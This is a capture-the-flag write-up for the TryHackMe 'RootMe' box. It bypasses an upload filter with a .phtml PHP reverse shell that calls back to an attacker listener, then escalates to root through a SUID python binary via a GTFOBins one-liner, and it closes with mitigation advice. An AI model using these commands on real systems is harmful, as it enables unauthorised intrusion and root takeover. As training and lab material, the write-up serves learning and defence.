RootMe

TryHackMe difficulty: easy web · linux file upload · SUID

$ ./objective

Objective

A single Linux web host running Apache with a file-upload feature. The goal was full compromise — recover the user and root flags. The path ran through an upload panel with a weak extension filter (bypassed to plant a PHP reverse shell) and finished on a classic SUID-interpreter privilege escalation. Two textbook bugs, chained end to end.

Methodology

01 · Reconnaissance

Standard service scan, output saved for reference. SSH and an Apache web server were exposed — the web app was the obvious entry point.

02 · Web Enumeration

Directory brute-forcing against the Apache root surfaced two paths that matter: an upload /panel and the /uploads directory where submitted files land. Together those are an upload-to-RCE waiting to happen.

$ gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt

/css             (Status: 301)

/uploads         (Status: 301)   → where uploads are served
# .htaccess / .htpasswd / server-status all 403 — no leverage there

03 · Exploitation — upload bypass to reverse shell

The /panel upload form filters by file extension, and .php is rejected. But the filter is a blocklist, and Apache is happy to execute other PHP extensions — so renaming the payload to .phtml slipped straight past it. I took the standard PHP reverse shell, set the callback to my attack-box IP and port, and saved it:

terminalpayload prep
$ cp /usr/share/webshells/php/php-reverse-shell.php shell.phtml
# edit shell.phtml: set $ip to your attack-box IP (hostname -I), $port = 1234
$ hostname -I
10.x.x.x ...

Listener up first, then upload via /panel and trigger execution by browsing to the file in /uploads:

attack boxnetcat
$ nc -lvnp 1234
# then browse to: http://<TARGET_IP>/uploads/shell.phtml
Listening on 0.0.0.0 1234
Connection received on <TARGET_IP> 32770
Linux ip-... 5.15.0-generic x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

Foothold as www-data. The dumb shell is painful to work in, so I upgraded it to a proper TTY before going further — this makes tab-completion, arrow keys, and interactive commands behave:

reverse shellstabilize
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

From here the user flag was readable in the web user's reachable directories: redacted.

04 · Privilege Escalation — SUID Python

With a stable shell, I hunted for SUID binaries — files that run with their owner's privileges (root) regardless of who executes them. A SUID bit on an interpreter is a instant win, because an interpreter can spawn a shell.

www-data shellSUID hunt
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
...
-rwsr-xr-x 1 root root  /usr/bin/python   ← SUID on an interpreter
...

A SUID python is listed on GTFOBins for exactly this. The -p flag on the spawned shell is the key — it stops the shell from dropping the elevated privileges, so I land as root rather than back at www-data:

www-data shellGTFOBins
$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root

Root shell confirmed. The root flag was in root's home — box fully compromised: redacted.

root shell/root
# ls -la /root
-rw-r--r-- 1 root root  26  root.txt
# less /root/root.txt

$ ./mitigation

Mitigation

Each stage maps to a concrete fix. In priority order:

  • ▹ Never set the SUID bit on interpreters (python, perl, bash, etc.). It converts any low-priv foothold into root. Audit SUID binaries regularly (find / -perm -4000) and strip the bit from anything that doesn't strictly need it.
  • ▹ Validate uploads with an allowlist, and never execute the upload directory. Blocklisting .php misses .phtml, .php5, .phar, and more. Allow only known-good types, verify content (not just extension), store uploads outside the web root, randomize filenames, and disable script execution in /uploads (no PHP handler there).
  • ▹ Authenticate the upload panel. /panel was reachable without credentials — an anonymous file-upload endpoint is an open door.
  • ▹ Run the web service least-privileged and add egress controls. An outbound firewall rule would have blocked the reverse-shell callback, and monitoring on the uploads directory would have flagged the planted file.

$ ./takeaway

Takeaway

The two most common web-to-root paths in one box: an upload filter that blocklists instead of allowlists, and a SUID bit left on an interpreter. Neither is subtle, and both show up constantly in real environments — which is exactly why they're worth being fast and methodical about. Recon → foothold → stabilize → enumerate SUID → GTFOBins is a repeatable playbook, not a lucky guess.
